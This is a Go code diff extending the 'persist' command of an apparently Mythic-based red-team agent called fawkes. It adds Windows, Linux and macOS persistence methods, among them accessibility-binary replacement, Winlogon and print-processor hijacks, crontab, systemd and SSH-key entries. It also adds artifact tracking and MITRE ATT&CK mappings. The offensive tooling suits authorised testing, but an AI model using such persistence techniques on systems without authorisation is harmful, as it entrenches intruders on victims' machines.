@@ -2,6 +2,7 @@ package agentfunctions
 
 import (
 	"fmt"
+	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
 )
@@ -9,15 +10,20 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "persist",
-		Description:         "Install or remove persistence mechanisms (registry run key, startup folder, COM hijacking, screensaver hijacking, IFEO debugger)",
-		HelpString:          "persist -method <registry|startup-folder|com-hijack|screensaver|ifeo|list> -action <install|remove> [-name <name>] [-path <exe_path>] [-hive <HKCU|HKLM>] [-clsid <CLSID>] [-timeout <seconds>]",
-		Version:             3,
+		Description:         "Install or remove persistence mechanisms (registry, startup folder, COM hijack, screensaver, IFEO, winlogon helper, print processor, accessibility features)",
+		HelpString:          "persist -method <registry|startup-folder|com-hijack|screensaver|ifeo|winlogon|print-processor|accessibility|list> -action <install|remove> [-name <name>] [-path <exe_path>] [-hive <HKCU|HKLM>] [-clsid <CLSID>] [-timeout <seconds>]",
+		Version:             4,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1547.001", "T1547.009", "T1546.015", "T1546.002", "T1546.012"},
+		MitreAttackMappings: []string{"T1547.001", "T1547.009", "T1546.015", "T1546.002", "T1546.012", "T1053.003", "T1543.002", "T1546.004", "T1098.004", "T1543.004", "T1070.009", "T1547.004", "T1547.012", "T1546.008"},
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
-			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
+			SupportedOS: []string{
+				agentstructs.SUPPORTED_OS_WINDOWS,
+				agentstructs.SUPPORTED_OS_LINUX,
+				agentstructs.SUPPORTED_OS_MACOS,
+			},
+			CommandCanOnlyBeLoadedLater: true,
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
@@ -25,8 +31,8 @@ func init() {
 				ModalDisplayName: "Persistence Method",
 				CLIName:          "method",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"registry", "startup-folder", "com-hijack", "screensaver", "ifeo", "list"},
-				Description:      "Persistence method: registry (Run key), startup-folder (copy to Startup), com-hijack (CLSID override), screensaver (idle trigger), ifeo (debugger hijack), or list (enumerate all)",
+				Choices:          []string{"registry", "startup-folder", "com-hijack", "screensaver", "ifeo", "winlogon", "print-processor", "accessibility", "crontab", "systemd", "shell-profile", "ssh-key", "launchagent", "list"},
+				Description:      "Persistence method. Windows: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility. Linux: crontab, systemd, shell-profile, ssh-key. macOS: launchagent. All: list.",
 				DefaultValue:     "registry",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -55,7 +61,7 @@ func init() {
 				ModalDisplayName: "Entry Name",
 				CLIName:          "name",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
-				Description:      "Name for the persistence entry (registry value name or startup folder filename)",
+				Description:      "Name for the persistence entry. Registry: value name. Startup: filename. IFEO/Accessibility: target exe (sethc.exe, utilman.exe). Winlogon: 'userinit' or 'shell'. Print-processor: processor name.",
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -113,6 +119,35 @@ func init() {
 				CLIName:          "timeout",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				Description:      "Idle timeout in seconds before screensaver triggers (for screensaver method). Default: 60",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+					},
+				},
+			},
+			{
+				Name:             "schedule",
+				ModalDisplayName: "Cron Schedule",
+				CLIName:          "schedule",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Crontab schedule expression (Linux crontab method). Default: */5 * * * * (every 5 minutes)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+					},
+				},
+			},
+			{
+				Name:                 "user",
+				ModalDisplayName:     "Target User",
+				CLIName:              "user",
+				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DynamicQueryFunction: getCallbackUserList,
+				Description:          "Target user for persistence (Linux ssh-key method). Default: current user.",
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -194,10 +229,68 @@ func init() {
 				case "ifeo":
 					path, _ := taskData.Args.GetStringArg("path")
 					createArtifact(taskData.Task.ID, "Registry Write", fmt.Sprintf("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s\\Debugger = %s", name, path))
+				case "winlogon":
+					path, _ := taskData.Args.GetStringArg("path")
+					target := name
+					if target == "" {
+						target = "Userinit"
+					}
+					createArtifact(taskData.Task.ID, "Registry Write", fmt.Sprintf("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\%s (appended %s)", target, path))
+				case "print-processor":
+					path, _ := taskData.Args.GetStringArg("path")
+					procName := name
+					if procName == "" {
+						procName = "FawkesProc"
+					}
+					createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("Print processor DLL: C:\\Windows\\System32\\spool\\prtprocs\\x64\\%s", path))
+					createArtifact(taskData.Task.ID, "Registry Write", fmt.Sprintf("HKLM\\...\\Print Processors\\%s\\Driver", procName))
+				case "accessibility":
+					path, _ := taskData.Args.GetStringArg("path")
+					target := name
+					if target == "" {
+						target = "sethc.exe"
+					}
+					createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("Replaced C:\\Windows\\System32\\%s with %s", target, path))
+				}
+			}
+			if action == "install" || action == "remove" {
+				logOperationEvent(taskData.Task.ID,
+					fmt.Sprintf("[PERSIST] persist %s %s (%s) on %s", action, method, name, taskData.Callback.Host), true)
+			}
+			return response
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			method, _ := processResponse.TaskData.Args.GetStringArg("method")
+			action, _ := processResponse.TaskData.Args.GetStringArg("action")
+			if action == "install" && strings.Contains(responseText, "Installed") {
+				desc := fmt.Sprintf("[Persistence Installed] method: %s", method)
+				if name, _ := processResponse.TaskData.Args.GetStringArg("name"); name != "" {
+					desc += ", name: " + name
+				}
+				createArtifact(processResponse.TaskData.Task.ID, "Persistence Mechanism", desc)
+			} else if method == "list" || action == "" {
+				// Track discovered persistence entries from enumeration
+				lines := strings.Split(responseText, "\n")
+				for _, line := range lines {
+					trimmed := strings.TrimSpace(line)
+					if strings.HasPrefix(trimmed, "- ") || (strings.Contains(trimmed, "=") && !strings.HasPrefix(trimmed, "Key:") && !strings.HasPrefix(trimmed, "HKCU") && !strings.HasPrefix(trimmed, "HKLM")) {
+						continue
+					}
+					// Track run key entries and startup folder entries
+					if strings.Contains(trimmed, "Run\\") || strings.Contains(trimmed, "Startup") && strings.Contains(trimmed, ":") {
+						createArtifact(processResponse.TaskData.Task.ID, "Persistence Mechanism", "[Persist Enum] "+trimmed)
+					}
 				}
 			}
 			return response
 		},
-		TaskFunctionProcessResponse: nil,
 	})
 }
